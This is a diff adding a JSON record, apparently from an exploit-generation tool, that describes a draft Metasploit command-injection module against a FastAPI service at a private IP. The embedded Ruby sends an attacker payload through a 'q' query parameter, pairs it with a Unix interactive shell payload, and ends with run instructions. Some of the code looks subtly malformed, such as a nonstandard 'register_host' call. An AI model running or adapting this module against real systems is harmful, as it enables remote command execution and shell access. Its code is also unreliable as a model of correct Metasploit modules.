@@ -1,0 +1,32 @@
+{
+  "module": {
+    "module_id": "MOD-001",
+    "name": "FastAPI Command Injection",
+    "module_type": "cmd_injection",
+    "target_service": "http://192.168.1.50:8080",
+    "target_platform": "linux",
+    "source_code": "class MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    register_host('RHOSTS', 'RPORT', 'TARGETURI')\n    super\n  end\n\n  def exploit\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri, 'filter'),\n      'vars_get' => {\n        'q' => payload\n      }\n    })\n  end\nend\n\n# Module options\n#   RHOSTS - The target address\n#   RPORT - The target port\n#   TARGETURI - The base path to the vulnerable\n  \n# Payload\n#   cmd/unix/interact - Shell interaction payload\n  \n# Example:\n#   set RHOSTS 192.168.1.50\n#   set RPORT 8080\n#   set TARGETURI /\n#   exploit",
+    "rpc_path": "$HOME/.msf4/modules/exploits/fastapi_cmd_inj.rb",
+    "payload_used": "cmd/unix/interact",
+    "execution_status": "draft",
+    "validation_results": [
+      {
+        "check_name": "syntax",
+        "status": "pass",
+        "message": "Ruby syntax check passed (ruby -c)"
+      },
+      {
+        "check_name": "load",
+        "status": "pending",
+        "message": "Module load status pending (reload_all)"
+      },
+      {
+        "check_name": "check_method",
+        "status": "pending",
+        "message": "check method execution pending"
+      }
+    ],
+    "created_at": "2024-03-15T10:30:00",
+    "updated_at": "2024-03-15T10:30:00"
+  }
+}
